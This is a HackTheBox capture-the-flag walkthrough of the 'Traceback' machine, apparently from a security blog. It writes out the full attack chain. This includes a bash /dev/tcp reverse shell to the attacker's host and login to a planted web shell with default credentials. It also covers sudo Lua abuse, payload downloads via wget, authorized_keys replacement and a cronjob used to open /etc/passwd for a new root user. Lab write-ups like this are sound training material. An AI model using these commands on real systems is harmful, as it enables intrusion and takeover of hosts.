<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Traceback HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/traceback-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-12T17:14:26+00:00">February 12, 2021</time><time class="updated" datetime="2025-06-22T15:29:01+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to crack a machine called Traceback. It was created by <span style="color: #0000ff;"><strong>Xh4H</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Enumerating Source Code</span></li>
<li><span style="color: #000000;">Enumerating Web Shells</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Getting a session using RCE on Web Shell</span></li>
<li><span style="color: #000000;">Enumerating sudo permission for webadmin user</span></li>
<li><span style="color: #000000;">Enumerating bash_histroy</span></li>
<li><span style="color: #000000;">Exploiting sudo permission of Lua</span></li>
<li><span style="color: #000000;">Getting a session as a sysadmin</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating using pspy64</span></li>
<li><span style="color: #000000;">Enumerating Cronjob tasks</span></li>
<li><span style="color: #000000;">Generating ssh public keys</span></li>
<li><span style="color: #000000;">Replacing the ssh authorized keys</span></li>
<li><span style="color: #000000;">Using the Motd.d to update permissions on /etc/passwd.</span></li>
<li><span style="color: #000000;">Logging using SSH</span></li>
<li><span style="color: #000000;">Creating a user</span></li>
<li><span style="color: #000000;">Editing /etc/passwd to add a high privilege user</span></li>
<li><span style="color: #000000;">Logging as high privilege user</span></li>
<li><span style="color: #000000;">Reading the Root Flag</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
<p><span style="color: #000000;">IP Address assigned: <strong>10.129.1.189</strong></span></p>
<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 10.129.1.189</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5EbiOTyX5HM/YCaxSdvyHVI/AAAAAAAAtoY/tywsTIJ6i6Yk7hP2K-gael92uxrJVt61gCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: 22 (SSH) and 80 (HTTP).</span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">As we don’t have credentials for the SSH, we began enumerating HTTP service. We opened the IP in the Browser to find out that this machine has already been owned. That’s weird for a CTF challenge but so common in real life. Let’s enumerate further.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.1.189</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ySt_ZO6Nw3o/YCaxYtxssdI/AAAAAAAAtoc/EsvIXC-QbkwAgOnX0pirCXjDN5aSmAkAACLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Tried to look for any clues inside the source code of the application. Found a comment which says “Some of the best web shells that you might need”. That’s oddly specific.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">view-source:http://10.129.1.189</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1tyWnYFw0RI/YCaxfp8YR8I/AAAAAAAAtog/aA-dYPSJBLo8_DLOLqV7_-GMMPZHUtcnQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Tried to google the statement. Turns out it is a title of a Repository on GitHub. You can find the repository <a style="color: #000000;" href="https://github.com/TheBinitGhimire/Web-Shells">here</a>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GP_DGQ8whzA/YCaxkk6ENoI/AAAAAAAAtoo/nOuz1O8SK7MqNwWCs354Biis9kV-TQ19gCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">The Repository contained some web shells. Since the machine is already pawned, there might be some shell on fly which we can use. We noted all the shells mentioned in the Repository.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WURiHd_dJhA/YCaxzioN-vI/AAAAAAAAto4/Y4tLIsTyTwMFStOrbnX6xmu2quRxhVkHACLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Then, we might have run a Directory Bruteforce but before we could do that, we checked smevk on random. It worked. Luck Us!</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.1.189/smevk.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NGAgMP1sFsw/YCax6ar_j2I/AAAAAAAAto8/Wzef0w2AlC4KXAcO7s6CJ76dzSkpCogYQCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Usually, shells have a set of default credentials which is mentioned on their README page or just commented on the php file. We went back to the repository and read the shell. Here, we found that the default credentials for smevk is admin: admin.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3iEPa26_0j4/YCayACLvf_I/AAAAAAAAtpE/H3oK_nzBD6MbpzjuVk6TgFjH72wc4jsZACLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">We tried admin: admin on the machine and we were in! That was easy.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hSKmRcCdrUA/YCayF-J2BSI/AAAAAAAAtpM/E9OrCl9KC24Y5R5E_ymeCUEhLLmmAmXsgCLcBGAsYHQ/s16000/8.png"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Exploitation</span> </span></h3>
<p><span style="color: #000000;">A typical web shell contains multiple methods to get a session on the target machine. We can use any of them such as uploading a payload or executing a command or creating a ssh key and uploading it. We decided to pop a shell using the one line as shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.52/443 0&gt;&amp;1'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K55EBngsQxs/YCayLV-T1KI/AAAAAAAAtpU/MNzol65u6is8HhQWz1vdMVKj9hZUkI1pwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Make sure to open a netcat listener before executing the one-liner on the same port. As soon as the script is executed, we get a shell on our netcat listener. Now that we have the shell, let’s check for sudo permissions for this user. We see that the current user can run luvit as sysadmin without a password. Let’s enumerate further for more clues. We looked around to find a bash_history file and a note. the note mentions Lua as well.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 443
sudo -l
cd webadmin
ls -la
cat note.txt
cat .bash_history</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZYm2XOAwZsA/YCayUIyPRFI/AAAAAAAAtpY/0vYGR9FKLdQEf_6LRaaJ3ZKPsX8PvPxKACLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">As we are not so versed in Lua, we refer to the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://gtfobins.github.io/gtfobins/lua/">gtfobins.github.io</a> </strong></span>for the way to execute a shell via Lua.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">lua -e 'os.execute("/bin/sh")'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7nuTm1rmBIQ/YCaya9AytEI/AAAAAAAAtpg/Rl4mFknQyYwIKrvev7w2oatXfZkg7O3OwCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Taking help from the gtfobin page and the bash history file we found we craft a Lua script and name it privesec.lua. Now using the same command, we found in the bash history we invoke a shell as the user sysadmin. We converted the shell invoked into a TTY shell using a python one-liner. Then, we enumerated the user flag and were able to read it as the user sysadmin.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 'os.execute("/bin/bash")' &gt; privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /home/sysadmin
cat user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Pnz9VpYGE_0/YCayh_2hhLI/AAAAAAAAtpo/D2GXpMa68P4gVuMLL5Ysfo0Wa3TP6PA-wCLcBGAsYHQ/s16000/12.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;"><strong>NOTE: </strong>There are a bunch of ways to elevate privilege on this machine. Some easier and some difficult as to what we did here.</span></p>
<p><span style="color: #000000;">Enumerating for a few moments as the user sysadmin and we didn’t get anything that could get us the root. This is where we decided to try our hand at pspy64. We downloaded it from our local machine and ran it after giving appropriate permissions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget 10.10.14.52:8080/pspy64
chmod 777 pspy64
./pspy64</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fy6AkTTlbRo/YCaypHAnR4I/AAAAAAAAtps/Gr3drHUsVE49VVcuEZVTORRkIPJEDbOlQCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">We see that every minute a Cronjob runs and restores the /etc/update-motd.d/. It basically runs twice with cronjob and followed by a 30-second sleep.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oQrHS3Jp0EU/YCayuisXV0I/AAAAAAAAtpw/zcC_Nhq8ulI-TfQAgNQz_xucOLXYMZ_cgCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">We could use this cronjob task to replace the authorized keys for the ssh. For this, we first need to create a key using ssh-keygen on our local system. Then move to the .ssh directory to get the public key we just created and change the permission for id_rsa so that it can be used to login using ssh and then copy the content of public key into the authorized keys and send that authorized keys to that target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh-keygen
cd /root/.ssh
chmod 600 id_rsa
cat id_rsa.pub &gt; authorized_keys
python -m SimpleHTTPServer</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ijuaWDF2SkA/YCay1kyAlZI/AAAAAAAAtp0/v5_a6zalcvAdMW0DypO-49T9hCfcMda7ACLcBGAsYHQ/s16000/15.png"/></span></p>
<h4><span style="color: #000000;">Root Privileged User</span></h4>
<p><span style="color: #000000;">Firstly, on the target machine, traverse into the .ssh directory and remove the authorized keys present here. Then download our authorized keys using wget.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rm /home/webadmin/.ssh/authorized_keys
wget 10.10.14.52:8000/authorized_keys</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2xbEsGXGZ8Q/YCay8_sYEoI/AAAAAAAAtp8/Y9HmE8WXtfcFwILlVO5_4cSt3FQaVBMtACLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">Now, comes the important part. The authorized keys can get us the ssh but we need root. We decided to create a user with root privilege. To do this we need to be able to edit the /etc/passwd file. We will use the cronjob file to provide appropriate permissions to the /etc/passwd file as shown in the image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 'chmod 777 /etc/passwd' &gt;&gt; 00-header</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vcRVknSVW4E/YCazCnyDS0I/AAAAAAAAtqA/mM6rBGmtt6o2VB9B8RwFMpqT3x_st3OcACLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">Let’s login into the target machine through the ssh and that executes the motd if it wasn’t already executed via cronjob and then we check if the permissions of the /etc/passwd file are updated.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_rsa webadmin@10.129.1.189
ls -la /etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-05LhOcFX57E/YCazN4ucOpI/AAAAAAAAtqM/bkiKD9uH7Q0waAYd3fU2NxsQUuAV82U_wCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">Back to our local machine, we used the openssl to create a new user with pass123 as its password which has root privileges.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl passwd -1 -salt user3 pass123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8G5xq9JuoNg/YCazV35fkbI/AAAAAAAAtqU/gb1n4sliMpk2DKMLL4wBURNqepixptA7QCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">Now we edit the target machine’s  /etc/passwd file and add a new user named raj and using the hash that we just created and giving it root privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XGPjO9PIuiI/YCazbSdx6OI/AAAAAAAAtqY/_CwKp1bw8cAlJ899p53JTAEUAZ8kJcvKQCLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">Then, we just login using the newly created user named raj and conclude this machine by reading the root flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail /etc/passwd
su raj
cat /root/root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Yj0k-bMYo2s/YCazgwnz8DI/AAAAAAAAtqc/HfTMzc7PEhUCFjXa6SU_F1sF_yBXm-YzQCLcBGAsYHQ/s16000/21.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
